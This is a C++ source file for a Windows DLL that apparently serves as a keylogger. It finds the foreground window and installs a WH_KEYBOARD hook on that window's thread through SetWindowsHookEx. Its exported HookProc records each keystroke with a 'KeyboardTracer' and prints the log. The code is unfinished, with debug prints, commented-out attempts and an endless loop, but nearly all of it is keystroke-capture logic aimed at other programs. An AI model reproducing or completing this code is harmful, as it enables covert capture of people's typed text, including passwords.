#include "pch.h"
#include "Pell.h"
#include "window_manager.h"
#include "keyboard_tracer.h"

#pragma data_seg(".sharedata")
HWND m_hWnd = 0;
HWND hWnd = 0;
HHOOK hHook = 0;
#pragma data_seg()

HINSTANCE hInst;
WindowManager* window_manager;
KeyboardTracer* tracer;

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		hInst = hModule;
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


#pragma region Export DLL 
extern "C" __declspec(dllexport) void init()
{
	initialize();
}

extern "C" __declspec(dllexport) void exit_key_log_info()
{
	delete window_manager;
}

extern "C" __declspec(dllexport) void print_win_title()
{
	window_manager->PrintWinTitle();
}

extern "C" __declspec(dllexport) void my_get_foreground_window()
{
	char buf[100];
	hWnd = GetForegroundWindow();
	if (hWnd == NULL)
	{
		std::cout << "[!!!] fail to set Window handle." << std::endl;

	}
	else
	{
		std::cout << "[*] set Window handle." << std::endl;
	}
	GetWindowTextA(hWnd, buf, 100);
	window_manager->SetWinTitle(buf);
	window_manager->SetWindowHandle(hWnd);
}

extern "C" __declspec(dllexport) void my_set_process_id()
{
	DWORD id;
	GetWindowThreadProcessId(hWnd, &id);
	window_manager->SetProcessId(id);
}

extern "C" __declspec(dllexport) DWORD get_process_id()
{
	return window_manager->GetProcessId();
}

extern "C" __declspec(dllexport) char* get_win_title()
{
	return window_manager->GetWinTitle();
}

#pragma endregion


void initialize()
{
	window_manager = new WindowManager();
	tracer = new KeyboardTracer();
	m_hWnd = GetForegroundWindow();
	char buf[100];
	GetWindowTextA(m_hWnd, buf, 100);
	window_manager->SetWinTitle(buf);
	window_manager->PrintWinTitle();
}

extern "C" __declspec(dllexport) LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	std::cout << "hello" << std::endl;
	//SendMessage(m_hWnd, WM_KEYDOWN, wParam, lParam);
	tracer->registKeyLog(wParam);
	//MessageBoxW(m_hWnd, L"hello", TEXT("click"), MB_OK);
	if (nCode < 0)
	{ 
		return CallNextHookEx(hHook, nCode, wParam, lParam);
	}
	tracer->setLpBinary(lParam);
	if (tracer->getLpBinary(0) == 1)
	{
		tracer->registKeyLog(wParam);
		tracer->print_log();
	}
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) void StartHook()
{
	if (hWnd == NULL)
	{
		std::cout << "[!!!] window handle is null. fail to start hook" << std::endl;
		return;
	}

	//HINSTANCE hInst;
	//hInst = (HINSTANCE)GetWindowLongPtr(hWnd, GWLP_HINSTANCE);
	
	
	//hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hInst, 0);


	//hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hInst, GetCurrentThreadId());
	hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hInst, GetWindowThreadProcessId(hWnd, NULL));
	//hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, NULL, 0);
	if (hHook == NULL)
	{
		std::cout << "[!!!] hook is null. fail to start hook" << std::endl;
		return;
	}
	else
	{
		std::cout << "[*] successfull, start hook." << std::endl;
		return;
	}
}

extern "C" __declspec(dllexport) bool EndHook()
{
	tracer->print_log();
	return UnhookWindowsHookEx(hHook);
}

extern "C" __declspec(dllexport) void Wait()
{
	//HACCEL hAccelTable = LoadAccelerators(hInst, MAKEINTRESOURCE(IDC_WINDOWSPROJECT1));
	MSG msg;
	int bValue;
	std::cout << "wait" << std::endl;
	int i = 0;
	/*while ((bValue = GetMessage(&msg, hWnd, 0, 0)) != 0)
	{
		if (bValue == -1)
		{
			break;
		}
		else 
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}*/
	while (TRUE)
	{
		if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
		{
			if (msg.message == WM_QUIT) {
				break;
			}
			std::cout << "treeans" << std::endl;
			DispatchMessage(&msg);
		}
		else
		{
			if (msg.wParam == WH_KEYBOARD)
			{
				std::cout << "trans" << std::endl;
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
	}
}

extern "C" __declspec(dllexport) void Wait2()
{

	while (true)
	{
		std::cout << "loop" << std::endl;
	}
}



